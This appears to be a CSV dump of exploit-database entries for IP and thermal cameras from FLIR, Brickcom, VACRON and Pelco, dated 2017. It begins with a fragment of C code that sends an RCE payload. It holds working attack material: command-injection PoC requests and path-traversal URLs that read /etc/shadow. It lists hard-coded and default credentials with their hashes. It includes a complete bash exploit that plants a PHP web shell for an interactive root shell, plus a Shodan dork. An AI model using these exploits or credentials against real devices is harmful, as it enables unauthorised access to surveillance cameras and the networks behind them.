if (!(payload = calloc(512, sizeof(char))))
return (1);
sock = 0;
printf(""[+] %s payload ... "", desc);
if ((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0)
printf(""Error while creating socket\n"");
return (1);
memset(&serv_addr, '0', sizeof(serv_addr));
serv_addr.sin_family = AF_INET;
serv_addr.sin_port = htons(CAM_PORT);
if (inet_pton(AF_INET, argv, &serv_addr.sin_addr) <= 0)
printf(""Error while inet_pton\n"");
return (1);
if (connect(sock, (struct sockaddr *)&serv_addr , sizeof(serv_addr)) < 0)
printf(""rce: connect failed\n"");
return (1);
sprintf(payload, attack, id, id + 32);
if (send(sock, payload, strlen(payload) , 0) < 0)
printf(""rce: send failed\n"");
return (1);
return (0);"
2017-09-25,WebApps,Hardware,LiquidWorm,FLIR Thermal Camera F/FC/PT/D,Stream Disclosure,"Summary: FLIR's PT-Series of high-performance, multi-sensor pan/tilt cameras
Desc: FLIR suffers from an unauthenticated and unauthorized live stream disclosure.
http://TARGET:8081/graphics/livevideo/stream/stream3.jpg
http://TARGET:8081/graphics/livevideo/stream/stream1.jpg","FLIR Systems FLIR Thermal Camera F/FC/PT/D Stream Disclosure
Vendor: FLIR Systems, Inc.
Product web page: http://www.flir.com
Affected version: Firmware version: 8.0.0.64
Software version: 10.0.2.43
Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2
FC-Series S (FC-334-NTSC)
FC-Series ID
FC-Series-R
PT-Series (PT-334 200562)
D-Series
F-Series
bring thermal and visible-light imaging together in a system that gives you
video and control over both IP and analog networks. The PT-Series' precision
pan/tilt mechanism gives you accurate pointing control while providing fully
programmable scan patterns, radar slew-to-cue, and slew-to-alarm functions.
PT-Series cameras define a new standard of performance with five models that
provide full 640x480 thermal resolution.
Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le
Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082
Nexus Server/2.5.29.0
Nexus Server/2.5.14.0
Nexus Server/2.5.13.0
lighttpd/1.4.28
PHP/5.4.7
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5435
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5435.php
23.03.2017
PoC:"
2017-09-25,WebApps,Hardware,LiquidWorm,FLIR Thermal Camera FC-S/PT,Command Injection,"Summary: Get the best image detail in challenging imaging environments with the
Desc: FLIR FC-S/PT series suffer from an authenticated OS command injection vulnerability.","FLIR Systems FLIR Thermal Camera FC-S/PT Authenticated OS Command Injection
Vendor: FLIR Systems, Inc.
Product web page: http://www.flir.com
Affected version: Firmware version: 8.0.0.64
Software version: 10.0.2.43
Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2
FC-Series S (FC-334-NTSC)
PT-Series (PT-334 200562)
FLIR FC-Series S thermal network camera. The award-winning FC-Series S camera
sets the industry standard for high-quality thermal security cameras, ideal for
perimeter protection applications. The FC-Series S is capable of replacing multiple
visible cameras and any additional lighting and infrastructure needed to support
them.
This can be exploited to inject and execute arbitrary shell commands as the root user.
Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le
Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082
Nexus Server/2.5.29.0
Nexus Server/2.5.14.0
Nexus Server/2.5.13.0
lighttpd/1.4.28
PHP/5.4.7
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5437
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5437.php
23.03.2017
PoC request (sleep 17):
POST /page/maintenance/lanSettings/dns HTTP/1.1
Host: TARGET
Content-Length: 64
Accept: */*
Origin: http://TARGET
X-Requested-With: XMLHttpRequest
User-Agent: Testingus/1.0
Content-Type: application/x-www-form-urlencoded
Referer: http://TARGET/maintenance
Accept-Language: en-US,en;q=0.8,mk;q=0.6
Cookie: PHPSESSID=d1eabfdb8db4b95f92c12b8402abc03b
Connection: close
dns%5Bserver1%5D=8.8.8.8&dns%5Bserver2%5D=8.8.4.4%60sleep%2017%60"
2017-09-25,Remote,Hardware,LiquidWorm,FLIR Thermal Camera F/FC/PT/D,SSH Backdoor Access,"Summary: FLIR's PT-Series of high-performance, multi-sensor pan/tilt cameras
Desc: FLIR utilizes hard-coded credentials within its Linux distribution image.","FLIR Systems FLIR Thermal Camera F/FC/PT/D Hard-Coded SSH Credentials
Vendor: FLIR Systems, Inc.
Product web page: http://www.flir.com
Affected version: Firmware version: 8.0.0.64
Software version: 10.0.2.43
Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2
FC-Series S (FC-334-NTSC)
FC-Series ID
FC-Series-R
PT-Series (PT-334 200562)
D-Series
F-Series
bring thermal and visible-light imaging together in a system that gives you
video and control over both IP and analog networks. The PT-Series' precision
pan/tilt mechanism gives you accurate pointing control while providing fully
programmable scan patterns, radar slew-to-cue, and slew-to-alarm functions.
PT-Series cameras define a new standard of performance with five models that
provide full 640x480 thermal resolution.
These sets of credentials are never exposed to the end-user and cannot be changed
through any normal operation of the camera.
Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le
Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082
Nexus Server/2.5.29.0
Nexus Server/2.5.14.0
Nexus Server/2.5.13.0
lighttpd/1.4.28
PHP/5.4.7
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5436
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5436.php
23.03.2017
root:indigo
root:video
default:video
default:[blank]
ftp:video"
2017-09-25,WebApps,Hardware,LiquidWorm,FLIR Thermal Camera F/FC/PT/D,Information Disclosure,"Summary: FLIR's PT-Series of high-performance, multi-sensor pan/tilt cameras
Desc: Input passed thru several parameters is not properly verified before
// load configuration params
// TODO if don't exist configuration, create config.ini according system and nexus setup
// global
// server files
// server ini
// nexus cgi
// web
// xml files
// system
// TODO
// service
// server file
// help
// Debug mode
http://TARGET/api/xml?file=/etc/passwd
http://TARGET/api/xml?file=/etc/shadow
http://TARGET/api/xml?file=/proc/version
http://TARGET/api/xml?file=/root/.ssh/authorized_keys
http://TARGET/api/xml?file=/var/www/lighttpd.conf
http://TARGET/api/xml?file=../../../../../../../../../etc/passwd
http://TARGET/api/file/download/etc/shadow
http://TARGET/api/file/download/etc/passwd
http://TARGET/api/file/content/etc/shadow
http://TARGET/api/file/content/var/log/messages
http://TARGET/api/server/videosnap?file=../../../../../../etc/passwd
http://TARGET/onvif/device_service
http://TARGET/api/xml?file=/usr/local/nexus/server/conf/MessagingConfig.xml
http://TARGET/api/server/status/full
http://TARGET/api/xml?file=/usr/local/nexus/server/conf/FC-334-NTSC.ini
http://TARGET/api/xml?file=/usr/local/nexus/server/conf/scheduler.xml
http://TARGET/page/maintenance/view/server-lan
http://TARGET/api/xml?file=/tmp/SW_versions.txt
http://TARGET/api/xml?file=/usr/local/nexus/hardware/hardware.cfg
http://TARGET/api/file/ini/read
http://TARGET/api/xml?file=/var/www/data/config/app/clear.sh
#!/bin/bash
# is web root
# delete old files with spaces
# files to delete (deprecated, old...)
# delete files
http://TARGET/api/xml?file=/var/www/data/config/app/users.txt
http://TARGET/api/xml?file=/usr/local/nexus/server/conf/admin.passwd
http://TARGET/api/system/config/product","FLIR Systems FLIR Thermal Camera F/FC/PT/D Multiple Information Disclosures
Vendor: FLIR Systems, Inc.
Product web page: http://www.flir.com
Affected version: Firmware version: 8.0.0.64
Software version: 10.0.2.43
Release: 1.4.1, 1.4, 1.3.4 GA, 1.3.3 GA and 1.3.2
FC-Series S (FC-334-NTSC)
FC-Series ID
FC-Series R
PT-Series (PT-334 200562)
D-Series
F-Series
bring thermal and visible-light imaging together in a system that gives you
video and control over both IP and analog networks. The PT-Series' precision
pan/tilt mechanism gives you accurate pointing control while providing fully
programmable scan patterns, radar slew-to-cue, and slew-to-alarm functions.
PT-Series cameras define a new standard of performance with five models that
provide full 640x480 thermal resolution.
being used to read files. This can be exploited by an unauthenticated attacker
to read arbitrary files from local resources.
/var/www/data/controllers/api/xml.php:
68:    private function readFile($file)
69:    {
70:        if (!empty($file) && file_exists($file)) {
71:            $xml = file_get_contents($file);
72:            $this->setVar('result', $xml);
73:            $this->loadView('webservices/default');
74:        }
75:        else {
76:            $this->loadPageNotFound();
77:        }
78:    }
Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le
Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082
Nexus Server/2.5.29.0
Nexus Server/2.5.14.0
Nexus Server/2.5.13.0
lighttpd/1.4.28
PHP/5.4.7
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5434
Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5434.php
23.03.2017
Requests:
GET http://TARGET/api/xml?file=/var/www/data/modules/legacy/config.php HTTP/1.1
Output:
<?php
$configFile = ""config.ini"";
$config = parse_ini_file($configFile);
if (!$config || count($config) == 0 || !isset($config[""dir_nexus""]))
die(""error loading configuration file..."");
define (""BASE"",       $config[""dir_nexus""]);
define (""BIN"",        $config[""dir_bin""]);
define (""TMP_DIR"",    $config[""dir_tmp""]);
define (""SERVER_DIR"", $config[""dir_server""]);
define (""CONF_DIR"",   $config[""dir_conf""]);
define (""WEB_DIR"",      ""/web/"");
define (""TOOLS_DIR"",    ""/tools/"");
define (""HARDWARE_DIR"", ""/hardware/"");
define (""BACKUPS_DIR"",  ""/backups/"");
define (""BACKUPS_INI_DIR"",  BACKUPS_DIR . ""ini_files/"");
define (""BACKUPS_SYS_DIR"",  BACKUPS_DIR . ""system_files/"");
define (""INI_FILE"",        ""/server/conf/server.ini"");
define (""INI_DEFAULTS"", ""factory.defaults"");
define (""LOG_FILE"",        ""server.log"");
define (""LOG_DEFAULT_PATH"",""/server/logs"");
define (""SCANLIST_DEFAULT_PATH"",""/server/sl"");
define (""LIC_FILE"",        ""/server/license/license.txt"");
define (""ZOOM_LUT_FILE"",   ""/server/conf/zoom_lut.txt"");
define (""DICTIONARY_FILE"", ""/server/conf/dictionary.txt"");
define (""PELOC_D_FILE"",    ""/server/conf/PelcoD.map"");
define (""FIRMWARE_FILE"",    ""firmware.sh"");
define (""HARDWARE_FILE"",   BASE.""/hardware/hardware.cfg"");
define (""INI_SECTION_DEVICES"", ""Devices"");
define (""INI_SECTION_DEVICES_IDS"", "" Ids"");
define (""INI_SECTION_DEVICES_INTERFACE"", ""INTERFACE"");
define (""INI_SECTION_INTERFACE"", INI_SECTION_DEVICES_INTERFACE . "" Configuration - Device "");
define (""NEXUSCGI_DEFAULTPORT"", 0);
define (""NEXUSCGI_TYPE"", ""Nexus CGI Interface"");
define (""USERS_FILE"", ""config/app/users.txt"");
define (""WEBVERSION"", ""3.4.0.0"");
define (""RECOMENDEDSERVERVERSION"", ""2.5.13.0"");
define (""devicesFOLDER"",""devices"");
define (""configFOLDER"",""configuration"");
define (""driversFOLDER"",""drivers"");
define (""UNZIP"",""/usr/bin/unzip"");
define (""ZIP"",""/usr/bin/zip"");
define (""SUDO"", $config[""sudo""]);
define (""FLIRSYS"", $config[""flir_system""]);
define (""FLIRSTP"", $config[""flir_setup""]);
define (""CONFSRC"", $config[""config_source_dir""]);
define (""INISRC"", $config[""config_source_ini_dir""]);
define (""LOCK_FILE"", ""/server/conf/.locked"");
define (""START"",  SUDO . $config[""service_start""]);
define (""STOP"",   SUDO . $config[""service_stop""]);
define (""STATUS"", SUDO . $config[""service_status""]);
define (""SERVER_FILE"", SERVER_DIR . ""bin/"" .$config[""server_file""]);
define (""STARTUP_FILE"", $config[""startup_file""]);
define (""BOOT_FILE"", $config[""boot_file""]);
define ('LINE_FEED', ""\n"");
define (""HELP_FILES"", $config[""help_files""]);
define(""DEBUG"", $config[""debug_mode""]);
Other file requests:
The clear.sh script:
Output:
if [ ! -f ""index.php"" ]
then
echo ""please, run from web root""
exit -1
fi
echo ""deleting deprecated files (with spaces, ampersand and/or dots)""
find . -name ""* *"" -print0 | xargs -0 rm -f
echo
FILES_TODETELE=""webroot/images/models/
webroot/js/old/
FLIRish.php
footer.html.php
getCgiPort.php
global_functions.php
headerNavigation.php
index-login
isUserogged.php
log_users.php
mobile-loading.php
mobile-meta
testApifile.php
unauthorized.php
users.txt
wizard.php
api/
bundle/
conf/
config/app/clientdesc
config/app/update-files.sh
config/boot_settings.json
config/config.ini
flirfiles/
help/
js/
livevideo/
maintenance/
modules/legacy/
setup/
styles/
tmp/user_permissions.json
xmlfiles/
views/main/maintenance/files-extra.php
webroot/images/mobile/
webroot/images/livevideo/
webroot/images/advancedBottom.png
webroot/images/advancedMiddle.png
webroot/images/advancedTop.png
webroot/images/arrowUpMini.png
webroot/images/bgBottom.png
webroot/images/bgButton.png
webroot/images/bgButtonOn.png
webroot/images/bgFullBottom.png
webroot/images/bgFullMiddle.png
webroot/images/bgFullTop.png
webroot/images/bgMiddle.png
webroot/images/bgTop.png
webroot/images/bottomBar.png
webroot/images/flir.ico
webroot/images/leftMenuButton.png
webroot/images/_logoFlirMini
webroot/images/logoFlir.png
webroot/images/logoFlirMini.png
webroot/images/radio.png
webroot/images/tabBackground.png
webroot/css/flir.base.css
webroot/css/flir.ie.css
webroot/css/flir.maintenance.css
webroot/css/flir.mobile.css
webroot/css/flir.setup.css
webroot/css/flir.video.css
webroot/css/flir.wizard.css
webroot/css/jquery/jquery.jscrollpane.css
webroot/css/jquery/jquery-ui-1.8.7.custom.css
webroot/js/PIE_uncompressed.js
webroot/js/jquery/jquery-1.5.1.min.js
webroot/js/jquery/jquery-1.5.min.js
webroot/js/jquery/plugins/jquery.ba-dotimeout.js
webroot/js/jquery/plugins/jquery.dd.js
webroot/js/jquery/plugins/jquery.forms.js
webroot/js/jquery/plugins/jquery.i18n.properties-1.0.9.js
webroot/js/jquery/plugins/jquery.jscrollpane.js
webroot/js/jquery/plugins/jquery.mousewheel.js
webroot/js/jquery/plugins/jquery.touchable.js
webroot/js/jquery/plugins/jquery.touchable.js.orig
webroot/xml/host_types.xml
webroot/xml/devices/em
webroot/xml/devices/foveal
webroot/xml/devices/foveus/foveus_Foveus.xml
webroot/xml/devices/foveus/foveus_PTZ35x140.xml
webroot/xml/devices/foveus/foveus_Voyager.xml
webroot/xml/devices/geo/geo_Georeference.xml
webroot/xml/devices/gyro/gyro_TCM2.6.xml
webroot/xml/devices/i2c
webroot/xml/devices/interface/interface_Genetec.xml
webroot/xml/devices/interface/interface_ONVIF.xml
webroot/xml/devices/ir/ir_Microcore275Z.xml
webroot/xml/devices/ir/ir_Thermovision-2000.xml
webroot/xml/devices/ir/ir_Thermovision-3000.xml
webroot/xml/devices/onboard/onboard_LTC2990.xml
webroot/xml/devices/onboard/onboard_LTC2991.xml
webroot/xml/devices/osd/osd_BOB3.xml
webroot/xml/devices/pelco/pelco_PELCO_D.xml
webroot/xml/devices/pharos/pharos_Pharos.xml
webroot/xml/devices/plat/plat_Sagebrush.xml
webroot/xml/devices/plat/plat_Vehicle.xml
webroot/xml/devices/tass/tass_TASS.xml
webroot/xml/devices/video/video_Pleora.xml
webroot/xml/devices/visca/visca_VISCA.xml
webroot/xml/devices/thermostate
webroot/xml/devices/tvi""
echo ""clearing files""
for oldfile in $FILES_TODETELE
do
echo ""deleting $oldfile""
rm -rf $oldfile
done
echo
exit 0
Disclosing usernames and hashes:
user=ee11cbb19052e40b07aac0ca060c23ee
expert=b9b83bad6bd2b4f7c40109304cf580e1
admin=15f9a55de61622e9c2a61ce72663dc08
production=c8348b2fb046ff758256b3a5eadb4a8c
calibration=11df08a6fb66c9ae4eab03ba7db123b0
ee11cbb19052e40b07aac0ca060c23ee MD5 : user
b9b83bad6bd2b4f7c40109304cf580e1 MD5 : expert
15f9a55de61622e9c2a61ce72663dc08 MD5 : fliradmin
c8348b2fb046ff758256b3a5eadb4a8c MD5 : flirproduction
11df08a6fb66c9ae4eab03ba7db123b0 MD5 : flircal
Default credentials:
user:user
expert:expert
admin:fliradmin
production:flirproduction
calibration:flircal
AeRMh9wBkCS9k
Product info:
{""product"":{""name"":""generic"",""sensors"":[{""type"":""optronic"",""max"":1,""devices"":[{""type"":""video"",""text"":{""default"":""Video""},""max"":4,""drivers"":[""uFLIRish Bullet Video"",""uFLIRish Bullet Video Snap"",""uFLIRish Bullet Video Web""]},{""type"":""interface"",""text"":{""default"":""VMS Remote""},""max"":3,""drivers"":[""Nexus CGI Interface"",""ONVIF v2.0"",""Lenel Interface""]},{""type"":""ir"",""text"":{""default"":""IR""},""max"":1,""drivers"":[""FLIR Tau v2.x"",""FLIR Radiometric Tau""]},{""type"":""plat"",""text"":{""default"":""Pan & Tilt""},""max"":1,""drivers"":[""Fixed Mount P&T""]},{""type"":""io"",""text"":{""default"":""GPIO""},""max"":1,""drivers"":[""Linux GPIO File Handle""]},{""type"":""osd"",""text"":{""default"":""OSD""},""max"":1,""drivers"":[""OSD uFLIRish""]},{""type"":""alarm_manager"",""text"":{""default"":""Alarm Manager""},""max"":1,""drivers"":[""Alarm Manager v3.0""]},{""type"":""geo"",""text"":{""default"":""Georeference""},""max"":1,""drivers"":[""Georeference""]}]}],""maxSensors"":1,""maxDevices"":255,""ports"":[{""id"":""\/dev\/ttyp0"",""text"":{""default"":""VIPE Video""}},{""id"":""\/dev\/ttyS1"",""text"":{""default"":""CAM""}}],""aseriesfirmware"":false,""mcufirmware"":false,""sffc"":false,""rescueMode"":false},""sections"":[{""type"":""networking"",""text"":{""default"":""Networking""}}]}"
2017-09-25,WebApps,Hardware,LiquidWorm,FLIR Thermal Camera PT-Series (PT-334 200562),Root Remote Code Execution,"#!/bin/bash
# FLIR Systems FLIR Thermal Camera PT-Series (PT-334 200562) Remote Root Exploit
# Vendor: FLIR Systems, Inc.
# Product web page: http://www.flir.com
# Affected version: Firmware version: 8.0.0.64
#                   Software version: 10.0.2.43
#                   Release: 1.3.4 GA, 1.3.3 GA and 1.3.2
# Summary: FLIR's PT-Series of high-performance, multi-sensor pan/tilt cameras
# bring thermal and visible-light imaging together in a system that gives you
# video and control over both IP and analog networks. The PT-Series' precision
# pan/tilt mechanism gives you accurate pointing control while providing fully
# programmable scan patterns, radar slew-to-cue, and slew-to-alarm functions.
# PT-Series cameras define a new standard of performance with five models that
# provide full 640x480 thermal resolution.
# Desc: FLIR Camera PT-Series suffers from multiple unauthenticated remote command
# injection vulnerabilities. The vulnerability exist due to several POST parameters
# in controllerFlirSystem.php script when calling the execFlirSystem() function not
# being sanitized when using the shell_exec() PHP function while updating the network
# settings on the affected device. This allows the attacker to execute arbitrary system
# commands as the root user and bypass access controls in place.
# ========================================================
# bash-3.2$ ./flir0.sh 10.0.0.10 8088
# Probing target: http://10.0.0.10:8088
# Status: 200
# Target seems OK!
# You got shell!
# Ctrl+C to exit.
# [root@FLIR ~]# id;pwd;uname -a
# uid=0(root) gid=0(root)
# /var/www/data/maintenance
# Linux FLIR 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082 #1 Wed May 1 12:25:27 PDT 2013 armv5tejl unknown
# [root@FLIR ~]# ^C
# bash-3.2$
# ========================================================
# Tested on: Linux 2.6.18_pro500-davinci_evm-arm_v5t_le
#            Linux 2.6.10_mvl401-davinci_evm-PSP_01_30_00_082
#            Nexus Server/2.5.29.0
#            Nexus Server/2.5.14.0
#            Nexus Server/2.5.13.0
#            lighttpd/1.4.28
#            PHP/5.4.7
# Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
#                             @zeroscience
# Advisory ID: ZSL-2017-5438
# Advisory URL: https://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5438.php
# 23.03.2017","set -euo pipefail
IFS=$'\n\t'
if [ ""$#"" -ne 2 ]; then
echo -e ""Usage: $0 ipaddr port\\n""
exit 1
fi
ip=$1
port=$2
echo -e ""\\nProbing target: http://$ip:$port\\n""
payload=""dns%5Bdhcp%5D=%60echo+\""<?php+system(\\\\\$_GET['c']);?>\"">test.php%60&dns%5Bserver1%5D=8.8.8.8&dns%5Bserver2%5D=""
htcode=$(curl -Is -G http://""$ip"":""$port""/maintenance/controllerFlirSystem.php -d""$payload"" 2>/dev/null | head -1 | awk -F"" "" '{print $2}')
echo -ne ""Status: ""; echo ""$htcode""
if [ ""$htcode"" == ""200"" ]; then
echo ""Target seems OK!""
else
echo ""Ajdee...something went wrong. Check your target.""
exit 1
fi
echo -e ""You got shell!\\nCtrl+C to exit.\\n""
while true; do
echo -ne ""\\033[31m"";
read -rp ""[root@FLIR ~]# "" cmd
echo -ne ""\\033[00m"";
shell=""http://$ip:$port/maintenance/test.php?c=${cmd// /+}""
curl ""$shell""
done"
2017-08-29,WebApps,Hardware,Emiliano Ipar,Brickcom IP Camera,Credentials Disclosure,"http://www.brickcom.com
https://www.brickcom.com/news/productCERT_security_advisorie.php","1. Advisory Information
Title:
Brickcom IP-Camera Remote Credentials and Settings Disclosure
Vendor Homepage:
Tested on Camera types:
WCB-040Af, WCB-100A, WCB-100Ae, OB-302Np, OB-300Af, OB-500Af
Remotely Exploitable:
Yes
Vulnerability:
Username / Password / Settings Disclosure (Critical)
Shodan Dork:
title:""Brickcom""
Date:
14/12/2016
Authors:
Emiliano Ipar         (@maninoipar)      (linkedin.com/in/emilianoipar)
Ignacio Agustín Lizaso         (@ignacio_lizaso) (linkedin.com/in/ignacio-
lizaso-9ab73359)
Gastón Emanuel Rivadero (@derlok_epsilon) (linkedin.com/in/gaston-
emanuel-rivadero-858b9ba)
2. CREDIT
This vulnerability was identified during penetration test and Research by
Emiliano Ipar, Ignacio Lizaso and Gastón Rivadero.
3. Description
Brickom Cameras allow a low-privilege user to disclose every configuration
in the NVRAM, including credentials in clear text, remotely by making a
simple requests. This vulnerability, coupled with the fact that there are
two default users with known passwords which are rarely modified, allows an
attacker to disclose the admin password and latter every config.
The most Critical API call is users.cgi?action=getUsers, which provides
every user credential. Many other API calls to get information for the WIFI
password or FTP credentials, even the whole configuration, are affected
depending on the camera model.
On the hardware side, the UART console of some models (example: WCB-040Af,
with baudrate 38400) is exposed in the PCB and after soldering the
corresponding pins and connecting, the resulting shell has root access. A
simple NVSHOW command will list every config available in clear text,
including credentials.
4. Proof-of-Concept:
Using the following GET request:
curl http://<IP>:<PORT>/cgi-bin/users.cgi?action=getUsers -u user:pass -v
Request:
> GET /cgi-bin/users.cgi?action=getUsers HTTP/1.1
> Authorization: Basic <BASE64 user:pass>
> User-Agent: curl/7.35.0
> Host: <IP>:<PORT>
> Accept: */*
Response:
< HTTP/1.1 200 Ok
< Server: mini_httpd
< Cache-Control: no-cache
< Pragma: no-cache
< Expires: 0
< Content-Type: text/html
< Connection: close
size=3
User1.index=0
User1.username=admin
User1.password=admin
User1.privilege=1
User2.index=1
User2.username=viewer
User2.password=viewer
User2.privilege=0
User3.index=3
User3.username=rviewer
User3.password=rviewer
User3.privilege=2
5. SOLUTION
The vendor has been contacted and the firmware was updated. See disclosure
in:"
2017-07-20,WebApps,Hardware,Viktoras,VACRON VIG-US731VE 1.0.18-09-B727 IP Camera,Authentication Bypass,"# Exploit Title: IP Camera VACRON VIG-US731VE
# Date: 2017-07-18
# Exploit Author: anonymous
# Vendor Homepage: www.vacron.com
# Version: V1.0.18-09-B727","1. doesn't require credentials to fetch snapshot like this: http://192.168.0.200/ipcam/jpeg
2. allows ""viewer"" level user to fetch any camera setting, eg admin user and password: http://192.168.0.200/vb.htm?adminid&adminpwd
there is newer firmware available from the vendor, but I haven't tested on that one."
2017-07-10,WebApps,Hardware,LiquidWorm,Pelco Sarix/Spectra Cameras,Remote Code Execution,"Summary: Pelco offers the broadest selection of IP cameras designed
Desc: The affected cameras suffer from authenticated remote code","Schneider Electric Pelco Sarix/Spectra Cameras Root Remote Code Execution
Vendor: Schneider Electric SE
Product web page: https://www.pelco.com
Affected version: Sarix Enhanced - Model: IME219 (Firmware: 2.1.2.0.8280-A0.0)
Sarix Enhanced - Model: IME119 (Firmware: 2.1.2.0.8280-A0.0)
Sarix - Model: D5230 (Firmware: 1.9.2.23-20141118-1.9330-A1.10722)
Sarix - Model: ID10DN (Firmware: 1.8.2.18-20121109-1.9110-O3.8503)
Spectra Enhanced - Model: D6230 (Firmware: 2.2.0.5.9340-A0.0)
for security surveillance in a wide variety of commercial and industrial
settings. From our industry-leading fixed and high-speed IP cameras to
panoramic, thermal imaging, explosionproof and more, we offer a camera
for any environment, any lighting condition and any application.
When nothing but the best will do. Sarix™ Enhanced Range cameras
provide the most robust feature-set for your mission-critical applications.
With SureVision™ 3.0, Sarix Enhanced delivers the best possible image
in difficult lighting conditions such as a combination of bright areas,
shaded areas, and intense light. Designed with superior reliability,
fault tolerance, and processing speed, these rugged fixed IP cameras
ensure you always get the video that you need.
execution vulnerability. The POST parameter 'enable_leds' located
in the update() function called via the GeneralSetupController.php
script is not properly sanitised before being used in writeLedConfig()
function to enable led state to on or off. A remote attacker can
exploit this issue and execute arbitrary system commands granting
her system access with root privileges using a specially crafted
request and escape sequence to system shell.
/var/www/core/setup/controllers/GeneralSetupController.php:
43: public function update() {
44:         $errOccurred = false;
45:         $logoreboot = false;
46:
47:         // If can update general settings
48:         if ($this->_context->_user->hasPermission(""{51510980-768b-4b26-a44a-2ae49f308184}"")) {
49:
50:             $errors = $this->validateInputs(""setup"", ""general.invalid"");
51:
52: //
53:             $new_logo_path;
54:             if (empty($errors) && (strlen($_FILES[""new_logo_path""][""name""]) > 0)) {
55:                 // The user has provided a file to load in as an image.  Verify that the file is ok.
56:                 $errors = $this->storeBmpFileIfValid($new_logo_path, $width, $height);
57:             } else {
58:                 // In this case, get the width and height from the omons settings
59:                 $width = intval($this->_conf->get(""Video/Overlay"", ""LogoWidth""));
60:                 $height = intval($this->_conf->get(""Video/Overlay"", ""LogoHeight""));
61:             }
62: //
63:             if (empty($errors)) {
64:                 $device_name = $_POST[""device_name""];
65:
66:                 $this->_conf->set(""Device"", ""FriendlyName"", $device_name);
67:
68:                 // update smtp server; append port 25 if it's not provided by the user
69:                 $smtpServer = $_POST[""smtp_server""];
70:
71:                 if ((! empty($smtpServer)) && preg_match(self::kHostPortRegex, $smtpServer) == 0) {
72:                     $smtpServer .= "":"" . self::kDefaultSmtpPort;
73:                 }
74:
75:                 $this->_conf->set(""Networking"", ""SmtpServer"", $smtpServer);
76:
77: //
78:                 $success = $this->writeLedConfig($_POST[""enable_leds""]);
79: //
80:             } else {
81:                 $this->_context->setError(""phobos"", ""validation.failure"");
82:                 $this->_context->setErrorList($errors);
83:
84:                 $errOccurred = true;
85:             }
86:         }
Bonus hint: When uploading a bmp logo, you can modify the width offset for example and inject persistent code:
-> 12h: 00 01 00 00 ; width (max 0x100, min 0x20)
191:             if ($logoOverlay) {
192:                 if($logoreboot) {
193:                     $cmd = ""/usr/bin/overlayLogo "" . $logo_justification . "" "" . $logo_row . "" "" . $width  . "" "" .  $height . "" 0"";
194:                     exec($cmd);
195:                 }
196:             } else {
197:                 $cmd = ""/usr/bin/overlayLogo 1 1 1 1 1"";
198:                 exec($cmd);
199:             }
265:         $vparams[""enable_leds""] = $this->getLedConfig();
266: //
267:         $vparams[""device_name""]  = $this->_conf->get(""Device"", ""FriendlyName"");
268:         $vparams[""TimeFormat""] = $this->_conf->get(""Video/Overlay"", ""TimeFormat"");
269:         $vparams[""date_formats""] = $this->getDateFormats();
270:         $vparams[""selectedDateFormat""] = $this->_conf->get(""Video/Overlay"", ""DateFormat"");
271:
272:         ob_start();
273:         passthru(""date +\"""" . $vparams[""TimeFormat""] . ""\"""");
274:         $vparams[""current_time""] = trim(ob_get_contents());
275:         ob_end_clean();
630:     /** @param $state string ""on"" or ""off"" */
631:     protected function writeLedConfig($state) {
632:         $encoded = array('type' => 'uint32',
633:             'value' => ($state == 'on' ? 1 : 0));
634:
635:         $rest = $this->getRestProxy();
636:         $params = array(array('type' => 'uint32', 'value' => 10), $encoded);
637:         $response = $rest->GetWithPayload('/internal/msgbus/com.pelco.hardware.led/SetState?',
638:                                'application/json',
639:                                $params);
640:
641:         return ($response->GetStatus() == 200);
642:     }
Tested on: Linux 2.6.10_mvl401-1721-pelco_evolution #1 Tue Nov 18 21:15:30 EST 2014 armv5tejl unknown
MontaVista(R) Linux(R) Professional Edition 4.0.1 (0600980)
Lighttpd/1.4.28
PHP/5.3.0
Vulnerability discovered by Gjoko 'LiquidWorm' Krstic
@zeroscience
Advisory ID: ZSL-2017-5417
Advisory URL: http://www.zeroscience.mk/en/vulnerabilities/ZSL-2017-5417.php
07.04.2017
PoC sleep 17s:
POST /setup/system/general/update HTTP/1.1
Host: 192.168.1.1
Content-Length: x
Cache-Control: max-age=0
Origin: http://192.168.1.1
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36
Content-Type: application/x-www-form-urlencoded
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Referer: http://192.168.1.1/setup/system/general
Accept-Language: en-US,en;q=0.8,mk;q=0.6
Cookie: PHPSESSID=p2ooorb7gloavc0et2stj2tnn4; authos-token=07E14CAF; svcts=1495616826
Connection: close
device_name=ZSL&enable_leds=%60sleep%2017%60&smtp_server=&ntp_server_from_dhcp=false&ntp_server=time.nist.gov&region=Universe&zone=Earth&enable_time_overlay=on&enable_name_overlay=off&position=topright&date_format=0
PoC echo:
POST /setup/system/general/update HTTP/1.1
Host: 192.168.1.1
enable_leds=%60echo%20251%20>test.html%60
GET http://192.168.1.1/test.html HTTP/1.1
Response:
251"
